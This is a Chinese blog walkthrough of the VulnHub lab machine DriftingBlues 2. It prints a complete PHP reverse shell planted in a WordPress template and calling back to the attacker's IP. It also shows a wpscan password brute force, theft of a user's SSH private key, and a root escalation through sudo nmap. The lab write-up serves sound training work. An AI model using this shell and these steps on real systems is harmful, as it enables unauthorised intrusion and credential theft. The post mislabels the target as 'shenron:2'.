> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/E10lqIDcq8I4wvk_eOyx_g)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 36篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究

![图片](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

靶机信息  

-------

下载地址:

```
https://www.vulnhub.com/entry/driftingblues-2,634/
```

靶场: VulnHub.com

靶机名称: shenron:2

难度: 简单

发布时间: 2020年12月17日

提示信息:

```
无
```

目标: 2个flag

  

实验环境
----

```
`攻击机:VMware kali 192.168.7.3``靶机:Vbox linux IP自动获取`
```

信息收集  

-------

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 192.168.7.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到主机地址为192.168.7.183

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 192.168.7.183 -oN 2.nmap
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到3个开放端口：

```
`21:(FTP)可以匿名访问，里面有一个secret.jpg文件``22:(SSH)``80:(HTTP) apache2.4.38`
```

先把secret.jpg文件下载下来看看

```
ftp anonymous@192.168.7.183
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`ls``get secret.jpg`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

打开图片看看是什么

```
open .  //打开当前目录
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

通过图片没看到有价值的信息，可能做了隐藏，看来是CTF题型，先看看有没有隐藏文件在里面

```
file secret.jpg
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

没有隐藏文件，试了其他工具同样没有找到隐写的内容，估计是迷惑我们的。看看80端口

Web渗透
-----

```
http://192.168.7.183
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

好家伙全是图片，做个目录扫描吧

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.7.183 -x php,html,txt,zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

扫描到blog目录，访问看看

```
http://192.168.7.183/blog
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

访问后是wordpress程序，看链接需要绑定域名

```
sudo vi /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

绑定后刷新页面恢复正常，我们用wpscan找一下漏洞

```
wpscan --url http://driftingblues.box/blog --api-token 你的api-token -e
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

没有漏洞，只找到1个用户名，看来又要暴破密码了

### wpscna密码暴破  

```
wpscan --url http://driftingblues.box/blog --usernames albert --passwords /usr/share/wordlists/rockyou.txt -t 10 --api-token 你的api-token
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到albert用户的密码scotland1登录后台

```
http://driftingblues.box/blog/wp-admin
```

登录后我们利用模板插入反弹shell代码

```
`set_time_limit (0);``$VERSION = "1.0";``$ip = '192.168.7.3';  // CHANGE THIS``$port = 4444;       // CHANGE THIS``$chunk_size = 1400;``$write_a = null;``$error_a = null;``$shell = 'uname -a; w; id; /bin/sh -i';``$daemon = 0;``$debug = 0;``//``// Daemonise ourself if possible to avoid zombies later``//``// pcntl_fork is hardly ever available, but will allow us to daemonise``// our php process and avoid zombies.  Worth a try...``if (function_exists('pcntl_fork')) {` `// Fork and have the parent process exit` `$pid = pcntl_fork();` `  if ($pid == -1) {` `printit("ERROR: Can't fork");` `exit(1);` `}` `  if ($pid) {` `exit(0);  // Parent exits` `}` `// Make the current process a session leader` `// Will only succeed if we forked` `if (posix_setsid() == -1) {` `printit("Error: Can't setsid()");` `exit(1);` `}` `$daemon = 1;``} else {` `printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");``}``// Change to a safe directory``chdir("/");``// Remove any umask we inherited``umask(0);``//``// Do the reverse shell...``//``// Open reverse connection``$sock = fsockopen($ip, $port, $errno, $errstr, 30);``if (!$sock) {` `printit("$errstr ($errno)");` `exit(1);``}``// Spawn shell process``$descriptorspec = array(` `0 => array("pipe", "r"),  // stdin is a pipe that the child will read from` `1 => array("pipe", "w"),  // stdout is a pipe that the child will write to` `2 => array("pipe", "w")   // stderr is a pipe that the child will write to``);``$process = proc_open($shell, $descriptorspec, $pipes);``if (!is_resource($process)) {` `printit("ERROR: Can't spawn shell");` `exit(1);``}``// Set everything to non-blocking``// Reason: Occsionally reads will block, even though stream_select tells us they won't``stream_set_blocking($pipes[0], 0);``stream_set_blocking($pipes[1], 0);``stream_set_blocking($pipes[2], 0);``stream_set_blocking($sock, 0);``printit("Successfully opened reverse shell to $ip:$port");``while (1) {` `// Check for end of TCP connection` `if (feof($sock)) {` `printit("ERROR: Shell connection terminated");` `break;` `}` `// Check for end of STDOUT` `if (feof($pipes[1])) {` `printit("ERROR: Shell process terminated");` `break;` `}` `// Wait until a command is end down $sock, or some` `// command output is available on STDOUT or STDERR` `$read_a = array($sock, $pipes[1], $pipes[2]);` `$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);` `// If we can read from the TCP socket, send` `// data to process's STDIN` `if (in_array($sock, $read_a)) {` `if ($debug) printit("SOCK READ");` `$input = fread($sock, $chunk_size);` `if ($debug) printit("SOCK: $input");` `fwrite($pipes[0], $input);` `}` `// If we can read from the process's STDOUT` `// send data down tcp connection` `if (in_array($pipes[1], $read_a)) {` `if ($debug) printit("STDOUT READ");` `$input = fread($pipes[1], $chunk_size);` `if ($debug) printit("STDOUT: $input");` `fwrite($sock, $input);` `}` `// If we can read from the process's STDERR` `// send data down tcp connection` `if (in_array($pipes[2], $read_a)) {` `if ($debug) printit("STDERR READ");` `$input = fread($pipes[2], $chunk_size);` `if ($debug) printit("STDERR: $input");` `fwrite($sock, $input);` `}``}``fclose($sock);``fclose($pipes[0]);``fclose($pipes[1]);``fclose($pipes[2]);``proc_close($process);``// Like print, but does nothing if we've daemonised ourself``// (I can't figure out how to redirect STDOUT like a proper daemon)``function printit ($string) {` `if (!$daemon) {` `print "$string\n";` `}``}`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

插入完反弹shell后在kali攻击机上监听4444端口

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

开启监听后打开wp的首页面，触发反弹

```
http://driftingblues.box/blog/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

反弹成功，先切换到交互型的shell

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``Ctrl+z快捷键``stty -a``stty raw -echo;fg``reset`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

切换完成，现在可以收集敏感信息了

```
`cd /var/www/html/blog/``cat wp-config.php`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到数据库帐号密码，继续找

```
`cd /home``ls``cd freddie``ls -al``cd .ssh``ls -al`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

找到SSH登录密钥，我们可以读取，把他下载下来用freddie身份登录到靶机

1.靶机开启http服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2.靶机下载id_rsa文件

```
wget http://192.168.7.183:8000/id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载完成就可以登录SSH了

```
ssh freddie@192.168.7.183 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

登录成功，先一下flag

```
`ls``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到user.txt，找一下提权信息

nmap提权
------

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

找到可以用root用户身份执行nmap，查找下nmap如何提权

```
https://gtfobins.github.io/gtfobins/nmap/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

有了提权方法后我们来验证一下

```
`echo 'os.execute("/bin/bash")' >shell``sudo nmap --script=shell`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

提权成功，找一下flag（直接输入有点问题，输入的内容不回显直接复制python3 -c 'import pty;pty.spawn("/bin/bash")'切换到交互shell即可

```
`cd /root``ls``cat root.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到root.txt，游戏结束。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)